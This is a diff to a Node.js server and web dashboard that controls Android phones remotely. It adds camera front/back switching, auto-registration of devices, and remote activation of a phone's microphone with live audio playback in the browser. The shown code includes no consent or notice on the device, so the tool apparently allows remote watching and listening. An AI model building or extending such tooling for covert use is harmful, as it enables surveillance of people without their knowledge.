@@ -40,6 +40,8 @@ let latestFrames = {};
 let deviceSettings = {};
 let activeStreams = {};
 let frameQueues = {};
+let voiceStreams = {};
+let voiceDataQueue = {};
 
 function getDeviceSettings(deviceId) {
     if (!deviceSettings[deviceId]) {
@@ -76,11 +78,14 @@ function resolveLatestFrame(deviceId) {
     return bestFrame || null;
 }
 
-// Cleanup stale devices every 10s (lastSeen > 20s)
+// Cleanup stale devices every 15s (lastSeen > 60s AND no recent frames)
 setInterval(() => {
     const now = Date.now();
     devices = devices.filter(device => {
-        const stale = (now - (device.lastSeen || 0)) > 20000;
+        const lastSeen = device.lastSeen || 0;
+        const hasRecentFrames = frameQueues[device.id] && frameQueues[device.id].length > 0 &&
+            latestFrames[device.id] && (now - (latestFrames[device.id].ts || 0)) < 30000;
+        const stale = (now - lastSeen) > 60000 && !hasRecentFrames;
         if (stale) {
             console.log(`🧹 Removing stale device: ${device.id}`);
             delete deviceHeartbeats[device.id];
@@ -93,7 +98,7 @@ setInterval(() => {
         }
         return true;
     });
-}, 10000);
+}, 15000);
 
 // ========== HTTP API ==========
 
@@ -232,11 +237,25 @@ app.post('/api/batch', (req, res) => {
             });
         }
 
-        const dev = devices.find(d => d.id === deviceId);
-        if (dev) dev.lastSeen = Date.now();
+        // Auto-register device if not already in list (batch-only devices skip heartbeat)
+        let dev = devices.find(d => d.id === deviceId);
+        if (!dev) {
+            dev = {
+                id: deviceId,
+                name: deviceId,
+                connectedAt: new Date().toLocaleTimeString(),
+                firstSeen: Date.now(),
+                lastHeartbeat: new Date().toLocaleTimeString()
+            };
+            devices.push(dev);
+            console.log(`📱 Auto-registered from batch: ${deviceId}`);
+        }
+        dev.lastSeen = Date.now();
+        dev.lastHeartbeat = new Date().toLocaleTimeString();
 
         res.json({
             success: true,
+            settings: getDeviceSettings(deviceId),
             totalFrames: frameQueues[deviceId].length
         });
 
@@ -261,12 +280,113 @@ app.get('/api/frame/:deviceId', (req, res) => {
     res.json({ success: true, image: frame.image, ts: frame.ts });
 });
 
+// FLIP CAMERA (explicit front/back)
+app.post('/api/flip', (req, res) => {
+    try {
+        const { deviceId, camera } = req.body;
+        console.log(`🔄 Flip command: device=${deviceId}, camera=${camera}`);
+
+        if (!deviceId || !camera) {
+            return res.status(400).json({ success: false, error: 'Missing deviceId or camera' });
+        }
+
+        const ds = getDeviceSettings(deviceId);
+        ds.camera = camera;
+
+        const cmd = { command: 'flip', value: camera };
+        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+        pendingCommands[deviceId].push(cmd);
+        console.log(`📦 Flip queued: camera=${camera}`);
+
+        res.json({ success: true, settings: ds, command: cmd });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ========== VOICE COMMANDS ==========
+
+app.post('/api/voice/start', (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+        pendingCommands[deviceId].push({ command: 'voice_start', value: 'true' });
+        voiceStreams[deviceId] = { active: true, startedAt: Date.now(), packetsReceived: 0 };
+        console.log(`🎙️ Voice START queued for ${deviceId}`);
+        res.json({ success: true, command: 'voice_start', status: 'started' });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+app.post('/api/voice/stop', (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+        pendingCommands[deviceId].push({ command: 'voice_stop', value: 'false' });
+        if (voiceStreams[deviceId]) { voiceStreams[deviceId].active = false; voiceStreams[deviceId].stoppedAt = Date.now(); }
+        console.log(`⏹️ Voice STOP queued for ${deviceId}`);
+        res.json({ success: true, command: 'voice_stop', status: 'stopped' });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+app.get('/api/voice/status/:deviceId', (req, res) => {
+    const { deviceId } = req.params;
+    res.json({
+        success: true, deviceId,
+        isActive: voiceStreams[deviceId]?.active || false,
+        hasPendingCommand: pendingCommands[deviceId]?.some(c => c.command === 'voice_start' || c.command === 'voice_stop') || false,
+        packetsReceived: voiceStreams[deviceId]?.packetsReceived || 0,
+        startedAt: voiceStreams[deviceId]?.startedAt || null,
+        stoppedAt: voiceStreams[deviceId]?.stoppedAt || null
+    });
+});
+
+app.post('/api/voice/data', (req, res) => {
+    try {
+        const { deviceId, audio, count, timestamp, codec, sampleRate, channels } = req.body;
+
+        console.log(`🎙️ Voice data from ${deviceId}: ${count} packets`);
+        console.log(`📊 Codec: ${codec || 'pcm'}, Sample Rate: ${sampleRate || 8000}`);
+
+        if (!deviceId) {
+            return res.status(400).json({ success: false, error: 'deviceId required' });
+        }
+
+        if (!audio || audio.length === 0) {
+            return res.status(400).json({ success: false, error: 'No audio data' });
+        }
+
+        io.emit('voice_data', {
+            deviceId: deviceId,
+            audio: audio,
+            count: count || audio.length,
+            timestamp: timestamp || Date.now(),
+            codec: codec || 'pcm',
+            sampleRate: sampleRate || 8000,
+            channels: channels || 1
+        });
+
+        console.log(`✅ Voice broadcasted to ${io.engine.clientsCount} clients`);
+        res.json({ success: true, packetsReceived: audio.length });
+
+    } catch (e) {
+        console.error('❌ Voice error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
 // COMMAND SEND
 app.post('/api/command', (req, res) => {
     try {
         const { deviceId, command, value } = req.body;
-        console.log(`📡 HTTP Command: [${command}] for [${deviceId}]`);
+        console.log(`📨 HTTP Command: [${command}] for [${deviceId}]`);
 
+        // Update deviceSettings so heartbeat returns correct values
         const ds = getDeviceSettings(deviceId);
         switch (command) {
             case 'start':   ds.stream = true; break;
@@ -277,12 +397,12 @@ app.post('/api/command', (req, res) => {
             default: console.log(`⚠️ Unknown command: ${command}`);
         }
 
+        // Store full command object with value
         const cmd = { command, value: value ?? null };
-
         if (deviceId) {
             if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
             pendingCommands[deviceId].push(cmd);
-            console.log(`📋 Command queued for HTTP poll: ${command}`);
+            console.log(`📦 Command queued: ${command} (value: ${value ?? 'none'})`);
         }
 
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
@@ -297,25 +417,17 @@ app.get('/api/commands/:deviceId', (req, res) => {
         const { deviceId } = req.params;
         deviceHeartbeats[deviceId] = Date.now();
 
-        if (!findCanonicalDevice(deviceId)) {
-            devices.push({ id: deviceId, name: deviceId, connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now(), lastHeartbeat: new Date().toLocaleTimeString(), lastSeen: Date.now() });
-            console.log(`📱 Auto-registered: ${deviceId}`);
-        }
-
         let cmds = [];
         if (pendingCommands[deviceId] && pendingCommands[deviceId].length > 0) {
-            cmds = pendingCommands[deviceId].map(c => c.command);
+            cmds = pendingCommands[deviceId];
             pendingCommands[deviceId] = [];
-        }
-
-        if (cmds.length > 0) {
-            console.log(`✅ HTTP Poll delivered ${cmds.length} commands to ${deviceId}`);
+            console.log(`📤 Sending ${cmds.length} commands to ${deviceId}:`, cmds);
         }
 
         res.json({
             success: true,
             settings: getDeviceSettings(deviceId),
-            commands: cmds
+            commands: cmds  // Full command objects with value
         });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -355,7 +467,7 @@ app.get('/api/devices', (req, res) => {
             cameraPermission: d.cameraPermission || false,
             batteryOptimization: d.batteryOptimization || false,
             batteryPercentage: d.batteryPercentage || 0,
-            isConnected: (now - (d.lastSeen || 0)) < 20000,
+            isConnected: (now - (d.lastSeen || 0)) < 60000,
             hasWebSocket: !!activeStreams[d.id],
             lastHeartbeat: d.lastHeartbeat,
             connectedAt: d.connectedAt,
@@ -373,7 +485,7 @@ app.get('/api/device/:deviceId', (req, res) => {
         success: true,
         device: {
             ...device,
-            isConnected: (now - (device.lastSeen || 0)) < 20000,
+            isConnected: (now - (device.lastSeen || 0)) < 60000,
             hasWebSocket: !!activeStreams[device.id],
             settings: getDeviceSettings(device.id)
         }
@@ -686,7 +798,18 @@ app.get('/', requireAuth, (req, res) => {
         .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
         .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
         .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
-        .btn-flip { background:#2196F3; color:white; } .btn-flip:hover { background:#0b7dda; }
+        .btn-front { background:#2196F3; color:white; } .btn-front:hover { background:#0b7dda; }
+        .btn-back  { background:#9C27B0; color:white; } .btn-back:hover  { background:#7B1FA2; }
+        .btn-front.active-cam, .btn-back.active-cam { outline:3px solid #fff; transform:scale(1.06); }
+        .btn-voice-start { background:linear-gradient(135deg,#FF6B35,#F7C59F); color:#1a1a1a; font-weight:700; }
+        .btn-voice-start:hover { opacity:.88; }
+        .btn-voice-stop  { background:linear-gradient(135deg,#c62828,#e53935); color:white; }
+        .btn-voice-stop:hover  { opacity:.88; }
+        .voice-card { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
+        .voice-status { display:flex; align-items:center; gap:8px; font-size:13px; color:#888; margin-top:10px; }
+        .voice-dot { width:8px; height:8px; border-radius:50%; background:#555; transition:all .3s; }
+        .voice-dot.active { background:#4CAF50; box-shadow:0 0 8px #4CAF50; animation:pulse 1s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.4;} }
         .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
         .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
         .quality-btn.active { background:#667eea; border-color:#667eea; }
@@ -749,10 +872,37 @@ app.get('/', requireAuth, (req, res) => {
     </div>
     <div class="controls">
         <div class="section-title">🎮 CONTROLS</div>
-        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-flip" id="flipBtn">🔄 FLIP</button></div>
+        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-front" id="frontBtn">📷 FRONT</button><button class="btn btn-back active-cam" id="backBtn">📷 BACK</button></div>
         <div class="section-title">📐 QUALITY</div>
         <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
         <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
+    </div>
+    <div class="voice-card">
+        <div class="section-title">🎙️ PCM AUDIO PLAYER</div>
+        <div class="button-group" style="margin-bottom:8px;">
+            <button class="btn btn-voice-start" id="voiceStartBtn">🎙️ START LISTEN</button>
+            <button class="btn btn-voice-stop" id="voiceStopBtn">⏹ STOP</button>
+        </div>
+        <div class="voice-status">
+            <div class="voice-dot" id="voiceDot"></div>
+            <span id="voiceStatusText">Idle</span>
+            <span id="voicePacketCount" style="margin-left:auto;font-size:11px;color:#555;"></span>
+        </div>
+        <div style="margin-top:8px;display:flex;align-items:center;gap:8px;">
+            <span style="font-size:11px;color:#888;">VOL</span>
+            <input type="range" id="voiceVolume" min="0" max="200" value="100" step="5"
+                style="flex:1;accent-color:#4CAF50;cursor:pointer;">
+            <span id="voiceVolLabel" style="font-size:11px;color:#aaa;width:34px;">100%</span>
+        </div>
+        <div style="margin-top:8px;background:#1a1a1a;border-radius:6px;height:28px;overflow:hidden;position:relative;">
+            <div id="voiceLevelBar" style="height:100%;width:0%;background:linear-gradient(90deg,#4CAF50,#8BC34A);border-radius:6px;transition:width 0.08s;"></div>
+            <span style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:10px;color:#555;pointer-events:none;">AUDIO LEVEL</span>
+        </div>
+        <div style="margin-top:6px;font-size:10px;color:#444;display:flex;justify-content:space-between;">
+            <span id="voiceCodecInfo">PCM 16-bit LE</span>
+            <span id="voiceSampleRateInfo">– Hz</span>
+            <span id="voiceLatencyInfo">latency –</span>
+        </div>
     </div>
     <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
 </div>
@@ -887,7 +1037,30 @@ app.get('/', requireAuth, (req, res) => {
         overlayVideo.src = ''; overlayVideo.style.display = 'none';
         overlayPlaceholder.style.display = 'flex';
     };
-    document.getElementById('flipBtn').onclick = () => sendCommand('flip');
+    function setCameraBtn(cam) {
+        document.getElementById('frontBtn').classList.toggle('active-cam', cam === 'front');
+        document.getElementById('backBtn').classList.toggle('active-cam', cam === 'back');
+    }
+    document.getElementById('frontBtn').onclick = () => {
+        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
+        sendCameraFlip('front');
+    };
+    document.getElementById('backBtn').onclick = () => {
+        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
+        sendCameraFlip('back');
+    };
+    function sendCameraFlip(camera) {
+        setCameraBtn(camera);
+        if (wsReady) {
+            socket.emit('send_command', { deviceId: selectedDeviceId, command: 'flip', value: camera });
+        } else {
+            fetch('/api/flip', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: selectedDeviceId, camera })
+            }).catch(() => {});
+        }
+    }
 
     document.querySelectorAll('.quality-btn').forEach(btn => {
         btn.onclick = () => {
@@ -1053,6 +1226,173 @@ app.get('/', requireAuth, (req, res) => {
 
     fetchDevices();
     setInterval(fetchDevices, 3000);
+
+    // ========== PCM AUDIO PLAYER ==========
+    let voiceActive   = false;
+    let audioCtx      = null;
+    let gainNode      = null;
+    let analyserNode  = null;
+    let nextPlayTime  = 0;          // scheduled playback cursor
+    let totalVoicePackets = 0;
+    let levelAnimId   = null;
+
+    const voiceDot        = document.getElementById('voiceDot');
+    const voiceStatusText = document.getElementById('voiceStatusText');
+    const voicePacketCount= document.getElementById('voicePacketCount');
+    const voiceVolSlider  = document.getElementById('voiceVolume');
+    const voiceVolLabel   = document.getElementById('voiceVolLabel');
+    const voiceLevelBar   = document.getElementById('voiceLevelBar');
+    const voiceCodecInfo  = document.getElementById('voiceCodecInfo');
+    const voiceSrInfo     = document.getElementById('voiceSampleRateInfo');
+    const voiceLatInfo    = document.getElementById('voiceLatencyInfo');
+
+    // Volume slider
+    voiceVolSlider.oninput = () => {
+        const pct = voiceVolSlider.value;
+        voiceVolLabel.textContent = pct + '%';
+        if (gainNode) gainNode.gain.value = pct / 100;
+    };
+
+    function initAudio() {
+        if (audioCtx) { if (audioCtx.state === 'suspended') audioCtx.resume(); return; }
+        audioCtx     = new (window.AudioContext || window.webkitAudioContext)();
+        gainNode     = audioCtx.createGain();
+        gainNode.gain.value = voiceVolSlider.value / 100;
+        analyserNode = audioCtx.createAnalyser();
+        analyserNode.fftSize = 256;
+        gainNode.connect(analyserNode);
+        analyserNode.connect(audioCtx.destination);
+        nextPlayTime = audioCtx.currentTime;
+        startLevelMeter();
+    }
+
+    function startLevelMeter() {
+        if (levelAnimId) return;
+        const buf = new Uint8Array(analyserNode.frequencyBinCount);
+        function tick() {
+            levelAnimId = requestAnimationFrame(tick);
+            analyserNode.getByteTimeDomainData(buf);
+            let peak = 0;
+            for (let i = 0; i < buf.length; i++) {
+                const v = Math.abs(buf[i] - 128) / 128;
+                if (v > peak) peak = v;
+            }
+            voiceLevelBar.style.width = Math.min(peak * 200, 100) + '%';
+            voiceLevelBar.style.background = peak > 0.6
+                ? 'linear-gradient(90deg,#f44336,#FF5722)'
+                : 'linear-gradient(90deg,#4CAF50,#8BC34A)';
+        }
+        tick();
+    }
+
+    function setVoiceUI(active) {
+        voiceActive = active;
+        voiceDot.classList.toggle('active', active);
+        voiceStatusText.textContent = active ? 'Streaming...' : 'Idle';
+        voiceStatusText.style.color  = active ? '#4CAF50' : '#888';
+        if (!active) {
+            totalVoicePackets = 0;
+            voicePacketCount.textContent = '';
+            voiceLevelBar.style.width = '0%';
+            nextPlayTime = 0;
+        }
+    }
+
+    // START LISTEN — init AudioContext on user gesture (browser requires it)
+    document.getElementById('voiceStartBtn').onclick = () => {
+        initAudio();
+        setVoiceUI(true);
+        // Send command to Android to start sending audio
+        if (selectedDeviceId) {
+            fetch('/api/voice/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: selectedDeviceId })
+            }).catch(() => {});
+        }
+        console.log('🎙️ PCM player started');
+    };
+
+    document.getElementById('voiceStopBtn').onclick = () => {
+        setVoiceUI(false);
+        if (selectedDeviceId) {
+            fetch('/api/voice/stop', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: selectedDeviceId })
+            }).catch(() => {});
+        }
+        console.log('⏹ PCM player stopped');
+    };
+
+    // ===== WebSocket PCM listener =====
+    socket.on('voice_data', (data) => {
+        if (!data.audio || !voiceActive) return;
+
+        // Device filter: accept matching device OR any device if none selected
+        const idMatch  = !selectedDeviceId || data.deviceId === selectedDeviceId;
+        if (!idMatch) return;
+
+        // AudioContext must be init'd (user clicked START LISTEN)
+        if (!audioCtx || audioCtx.state === 'closed') return;
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+
+        const sampleRate = data.sampleRate || 8000;
+        const channels   = data.channels   || 1;
+        const codec      = (data.codec || 'pcm').toLowerCase();
+        const chunks     = Array.isArray(data.audio) ? data.audio : [data.audio];
+        const recvTs     = Date.now();
+
+        // Update info bar
+        voiceCodecInfo.textContent = 'PCM 16-bit LE';
+        voiceSrInfo.textContent    = sampleRate + ' Hz';
+
+        // Ensure playback cursor is not in the past
+        const now = audioCtx.currentTime;
+        if (nextPlayTime < now) nextPlayTime = now + 0.05; // small buffer
+
+        chunks.forEach(chunk => {
+            try {
+                // base64 → Uint8Array
+                const raw   = atob(chunk);
+                const bytes = new Uint8Array(raw.length);
+                for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
+
+                // Decode PCM 16-bit little-endian → float32
+                const samples  = Math.floor(bytes.length / 2);
+                if (samples === 0) return;
+
+                const buffer   = audioCtx.createBuffer(channels, samples, sampleRate);
+                const view     = new DataView(bytes.buffer);
+                for (let ch = 0; ch < channels; ch++) {
+                    const chanData = buffer.getChannelData(ch);
+                    for (let i = 0; i < samples; i++) {
+                        // For mono: both channels read same offset; for stereo: interleaved
+                        const idx = channels === 1 ? i : (i * channels + ch);
+                        const byteIdx = idx * 2;
+                        chanData[i] = byteIdx + 1 < bytes.length
+                            ? view.getInt16(byteIdx, true) / 32768.0
+                            : 0;
+                    }
+                }
+
+                // Scheduled play — seamless, no gaps
+                const src = audioCtx.createBufferSource();
+                src.buffer = buffer;
+                src.connect(gainNode);
+                src.start(nextPlayTime);
+                nextPlayTime += buffer.duration;
+
+                totalVoicePackets++;
+                voicePacketCount.textContent = totalVoicePackets + ' pkts';
+
+                // Latency estimate
+                const latMs = Math.round((audioCtx.currentTime - now) * 1000 + (nextPlayTime - audioCtx.currentTime) * 1000);
+                voiceLatInfo.textContent = 'buf ' + Math.round((nextPlayTime - audioCtx.currentTime) * 1000) + 'ms';
+
+            } catch(e) { console.warn('PCM decode error:', e.message); }
+        });
+    });
 </script>
 </body>
 </html>`);
